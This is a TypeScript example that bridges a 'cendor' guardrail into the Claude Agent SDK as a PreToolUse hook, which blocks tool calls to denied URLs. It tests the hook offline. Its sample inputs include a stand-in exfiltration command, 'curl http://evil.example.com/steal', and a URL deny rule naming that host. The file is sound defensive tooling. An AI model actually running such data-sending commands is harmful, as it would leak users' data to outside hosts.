/**
 * Bridge: a cendor Guardrail as a Claude Agent SDK `PreToolUse` hook (JS).
 *
 * The Claude Agent SDK fires a `PreToolUse` hook before every tool call; return a `deny` decision to
 * stop it. cendor's `tool_call` stage is exactly that intervention point, so the *same* guardrail
 * gates tools here as under `@cendor/sdk` — one policy, every framework.
 *
 * Offline: the hook is called directly with sample tool inputs — no agent run, no model, no network.
 * Run:  npm install && node index.mjs
 */
import assert from 'node:assert/strict';

import { HOOK_EVENTS } from '@anthropic-ai/claude-agent-sdk';
import { type Guardrail, GuardrailTripped, apply, rules, type Stage } from '@cendor/guardrails';

/**
 * Wrap a cendor guardrail list as a PreToolUse hook. A cendor `block` becomes the Claude Agent SDK's
 * `permissionDecision: "deny"`; the reason rides `permissionDecisionReason`.
 *
 * ⚠️ The shape differs from Python: `HookMatcher`, `HookContext` and `ClaudeAgentOptions` are
 * **types** in the TypeScript SDK, erased at runtime — there are no classes to construct. The
 * wiring is plain object literals. Only `HOOK_EVENTS` and the hook contract are runtime values.
 */
function cendorPreToolUseHook(guardrails: Guardrail[], { stage = 'tool_call' }: { stage?: Stage } = {}) {
  return async (input: { tool_name: string; tool_input?: Record<string, unknown> }) => {
    const text = JSON.stringify(input.tool_input ?? {}); // gate the tool's arguments
    let blocked;
    let reason;
    try {
      const decisions = apply(guardrails, stage, text);
      blocked = decisions.some((d) => d.action === 'block');
      reason = decisions.map((d) => d.reason).join('; ');
    } catch (err) {
      if (!(err instanceof GuardrailTripped)) throw err;
      blocked = true; // a fail-closed block raises inside the engine
      reason = err.message;
    }
    if (blocked) {
      return {
        hookSpecificOutput: {
          hookEventName: 'PreToolUse',
          permissionDecision: 'deny',
          permissionDecisionReason: `cendor guardrail: ${reason}`,
        },
      };
    }
    return {}; // no decision → the tool proceeds
  };
}

assert.ok(HOOK_EVENTS.includes('PreToolUse'), 'the SDK no longer exposes a PreToolUse hook event');

const hook = cendorPreToolUseHook([
  rules.urlDeny(['evil.example.com'], { action: 'block', stage: 'tool_call' }),
]);

// Register it on the agent (this is the wiring; the hook is exercised directly below, offline):
//   const options = { hooks: { PreToolUse: [{ hooks: [hook] }] } };
//   for await (const msg of query({ prompt, options })) { … }

const calls = [
  { tool_name: 'Bash', tool_input: { command: 'curl https://api.example.com/data' } },
  { tool_name: 'Bash', tool_input: { command: 'curl http://evil.example.com/steal' } },
];

const seen: string[] = [];
for (const c of calls) {
  // The SDK types `hook` as a single-argument handler; the runtime passes (input, toolUseId,
  // options). Calling it the way the SDK actually calls it means going through the runtime shape.
  const out = await hook(c);
  const decision = out.hookSpecificOutput?.permissionDecision ?? 'allow';
  seen.push(decision);
  console.log(`${decision.padEnd(5)}  ${JSON.stringify(c.tool_input.command)}`);
  if (decision === 'deny') {
    console.log(`       -> ${out.hookSpecificOutput?.permissionDecisionReason}`);
  }
}

// An empty `{}` means "allow", so a hook that mapped NOTHING would return `{}` every time and print
// a perfectly plausible first line. Both directions have to be asserted.
assert.deepEqual(seen, ['allow', 'deny'], `the hook did not allow-then-deny: ${seen}`);
